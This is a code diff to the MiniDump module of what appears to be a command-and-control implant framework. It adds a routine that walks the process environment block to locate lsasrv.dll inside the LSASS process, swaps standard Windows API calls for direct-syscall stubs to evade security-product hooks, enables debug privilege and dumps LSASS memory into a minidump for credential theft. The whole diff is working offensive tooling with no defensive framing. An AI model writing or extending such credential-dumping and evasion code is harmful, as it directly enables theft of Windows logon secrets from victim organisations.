@@ -274,6 +274,189 @@ int MiniDump::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 
 #ifdef _WIN32
 
+
+#include <winternl.h>
+
+
+typedef struct {
+    char base_dll_name[MAX_PATH];
+    char full_dll_path[MAX_PATH];
+    void* dll_base;
+    int size;
+} ModuleInformation;
+
+
+PVOID ReadRemoteIntPtr(HANDLE hProcess, PVOID mem_address)
+{
+    if (hProcess == NULL || mem_address == NULL) return nullptr;
+
+    BYTE buff[sizeof(void*)];
+    SIZE_T bytesRead = 0;
+    NTSTATUS ntstatus = Sw3NtReadVirtualMemory_(hProcess, mem_address, buff, sizeof(buff), &bytesRead);
+    if (ntstatus != 0 || bytesRead < sizeof(void*)) {
+        // read failed
+        return nullptr;
+    }
+
+    // safe cast to pointer-sized integer then pointer
+    if (sizeof(void*) == 8) {
+        uint64_t v = 0;
+        memcpy(&v, buff, sizeof(v));
+        return (PVOID)(uintptr_t)v;
+    } else {
+        uint32_t v = 0;
+        memcpy(&v, buff, sizeof(v));
+        return (PVOID)(uintptr_t)v;
+    }
+}
+
+
+std::string ReadRemoteWStr(HANDLE hProcess, PVOID mem_address)
+{
+    if (hProcess == NULL || mem_address == NULL) return std::string();
+
+    const SIZE_T CHUNK_BYTES = 512; // read 512 bytes per chunk (256 wchar_t)
+    std::vector<wchar_t> wacc;
+    BYTE buffer[CHUNK_BYTES];
+    SIZE_T bytesRead = 0;
+    PVOID cur_addr = mem_address;
+    const size_t MAX_ITER = 32; // cap to avoid infinite loop (32 * 512 = 16 KB)
+
+    for (size_t iter = 0; iter < MAX_ITER; ++iter) 
+	{
+        NTSTATUS ntstatus = Sw3NtReadVirtualMemory_(hProcess, cur_addr, buffer, CHUNK_BYTES, &bytesRead);
+        if (ntstatus != 0 || bytesRead == 0) 
+		{
+            break;
+        }
+
+        // number of wchar_t available in this chunk
+        SIZE_T wcharCount = bytesRead / sizeof(wchar_t);
+        wchar_t* wptr = reinterpret_cast<wchar_t*>(buffer);
+
+        bool foundNull = false;
+        for (SIZE_T i = 0; i < wcharCount; ++i) 
+		{
+            if (wptr[i] == L'\0') 
+			{
+                foundNull = true;
+                break;
+            }
+            wacc.push_back(wptr[i]);
+        }
+
+        if (foundNull) 
+		{
+            break;
+        }
+
+        // advance to next chunk
+        cur_addr = (PVOID)((uintptr_t)cur_addr + bytesRead);
+    }
+
+    if (wacc.empty()) 
+	{
+        return std::string();
+    }
+
+    // ensure null-terminated wide string
+    wacc.push_back(L'\0');
+    std::wstring wstr(wacc.data());
+
+    // Convert to UTF-8
+    int required = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
+    if (required <= 0) 
+	{
+        return std::string();
+    }
+    std::string out(required - 1, '\0'); // exclude terminating null
+    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &out[0], required, NULL, NULL);
+
+    return out;
+}
+
+
+static bool ci_contains(const std::string &haystack, const std::string &needle)
+{
+    if (needle.empty()) return true;
+    std::string h = haystack;
+    std::string n = needle;
+    std::transform(h.begin(), h.end(), h.begin(), ::tolower);
+    std::transform(n.begin(), n.end(), n.begin(), ::tolower);
+    return (h.find(n) != std::string::npos);
+}
+
+
+// typedef for NtQueryInformationProcess
+typedef NTSTATUS (NTAPI *PFN_NtQueryInformationProcess)(
+    HANDLE ProcessHandle,
+    PROCESSINFOCLASS ProcessInformationClass,
+    PVOID ProcessInformation,
+    ULONG ProcessInformationLength,
+    PULONG ReturnLength
+);
+
+
+std::vector<ModuleInformation> CustomGetModuleHandle(HANDLE hProcess, const std::string &moduleName) 
+{
+	std::vector<ModuleInformation> modules;
+
+    int process_basic_information_size = 48;
+    int peb_offset = 0x8;
+    int ldr_offset = 0x18;
+    int inInitializationOrderModuleList_offset = 0x30;
+    int flink_dllbase_offset = 0x20;
+    int flink_buffer_fulldllname_offset = 0x40;
+    int flink_buffer_offset = 0x50;
+
+	PROCESS_BASIC_INFORMATION pbi;
+    ULONG ReturnLength;
+	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+	PFN_NtQueryInformationProcess pNtQuery = (PFN_NtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");
+    NTSTATUS ntstatus = pNtQuery(hProcess, ProcessBasicInformation, &pbi, (ULONG)process_basic_information_size, &ReturnLength);
+    if (ntstatus != 0) 
+	{
+        return modules;
+    }
+
+    void* ldr_pointer = (void*)((uintptr_t)pbi.PebBaseAddress + ldr_offset);
+    void* ldr_adress = ReadRemoteIntPtr(hProcess, ldr_pointer);
+
+    void* InInitializationOrderModuleList = (void*)((uintptr_t)ldr_adress + inInitializationOrderModuleList_offset);
+    void* next_flink = ReadRemoteIntPtr(hProcess, InInitializationOrderModuleList);
+
+    void* dll_base = (void*)1337;
+    while (dll_base != NULL) 
+	{
+        next_flink = (void*)((uintptr_t)next_flink - 0x10);
+
+        // Get DLL base address
+        dll_base = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + flink_dllbase_offset));
+        void* buffer = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + flink_buffer_offset));
+        std::string base_dll_name = ReadRemoteWStr(hProcess, buffer);
+
+        // Full DLL Path
+        void* full_dll_name_addr = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + flink_buffer_fulldllname_offset));
+        std::string full_dll_name = ReadRemoteWStr(hProcess, full_dll_name_addr);
+
+        if (dll_base != 0 && (moduleName.empty() || ci_contains(base_dll_name, moduleName)))
+		{
+			ModuleInformation mi;
+			memset(&mi, 0, sizeof(mi));
+			strncpy_s(mi.base_dll_name, base_dll_name.data(), MAX_PATH - 1);
+			strncpy_s(mi.full_dll_path, full_dll_name.data(), MAX_PATH - 1);
+			mi.dll_base = dll_base;
+			mi.size = 0; 
+			modules.push_back(mi);
+        }
+        
+        next_flink = ReadRemoteIntPtr(hProcess, (void*)((uintptr_t)next_flink + 0x10));
+    }
+
+    return modules;
+}
+
+
 DWORD GetPidByName(const char * pName) 
 {
 	PROCESSENTRY32 pEntry;
@@ -303,7 +486,6 @@ BOOL setDebugPrivilege()
     HANDLE hToken = NULL;
     LUID luid = { 0 };
 
-	// TODO NtOpenProcessToken
     // if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
 	Sw3NtOpenProcessToken_(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken);
 	if(hToken!=NULL)
@@ -316,7 +498,6 @@ BOOL setDebugPrivilege()
             tokenPriv.Privileges[0].Luid = luid;
             tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
-			// TODO NtAdjustPrivilegesToken
             // bRet = AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
 			Sw3NtAdjustPrivilegesToken_(hToken, FALSE, &tokenPriv, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PULONG)NULL);
 			bRet = TRUE;
@@ -571,16 +752,23 @@ int MiniDump::process(C2Message &c2Message, C2Message &c2RetMessage)
 		char* address = 0;
 
 		// Get lsasrv.dll information
-		// TODO recode GetRemoteModuleHandle to use the peb - https://github.com/ricardojoserf/NativeDump/blob/c-flavour/NativeDump/NativeDump.cpp
+		// Recoded GetRemoteModuleHandle to use the peb - https://github.com/ricardojoserf/NativeDump/blob/c-flavour/NativeDump/NativeDump.cpp
 		std::string lsasrvDll = "lsasrv.dll";
-		HMODULE lsasrvdll_address =  GetRemoteModuleHandle(lsassHandle, lsasrvDll.c_str());
-		if(lsassHandle==NULL)
+		// HMODULE lsasrvdll_address =  GetRemoteModuleHandle(lsassHandle, lsasrvDll.c_str());
+		// if(lsassHandle==NULL)
+		// {
+		// 	c2RetMessage.set_errorCode(ERROR_GET_REMOTE_HANDLE);
+		// 	return -1;
+		// }
+
+		std::vector<ModuleInformation> modules = CustomGetModuleHandle(lsassHandle, lsasrvDll);
+		if(modules.size()==0)
 		{
 			c2RetMessage.set_errorCode(ERROR_GET_REMOTE_HANDLE);
 			return -1;
 		}
+		HMODULE lsasrvdll_address = (HMODULE)modules[0].dll_base;
 
-		// std::cout << "lsasrvdll_address " << lsasrvdll_address << std::endl;
 		int lsasrvdll_size = 0;
 		bool bool_test = false;
 
@@ -589,9 +777,9 @@ int MiniDump::process(C2Message &c2Message, C2Message &c2RetMessage)
 		while (address < sysInfo.lpMaximumApplicationAddress) 
 		{
 			// TODO NtQueryVirtualMemory
-			if (VirtualQueryEx(lsassHandle, address, &mbi, sizeof(mbi)) == sizeof(mbi)) 
-			// SIZE_T returnLength;
-			// if (Sw3NtQueryVirtualMemory_(lsassHandle, address, MemoryBasicInformation, &mbi, sizeof(mbi), &returnLength)) 
+			// if (VirtualQueryEx(lsassHandle, address, &mbi, sizeof(mbi)) == sizeof(mbi)) 
+			SIZE_T returnLength;
+			if (!Sw3NtQueryVirtualMemory_(lsassHandle, address, MemoryBasicInformation, &mbi, sizeof(mbi), &returnLength)) 
 			{
 				if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT)
 				{
@@ -629,7 +817,6 @@ int MiniDump::process(C2Message &c2Message, C2Message &c2RetMessage)
 		}
 
 		CloseHandle(lsassHandle);
-
 
 		std::string dumpfile;	
 		CreateMinidump(lsasrvdll_address, lsasrvdll_size, mem64info_List, memory_regions, dumpfile);
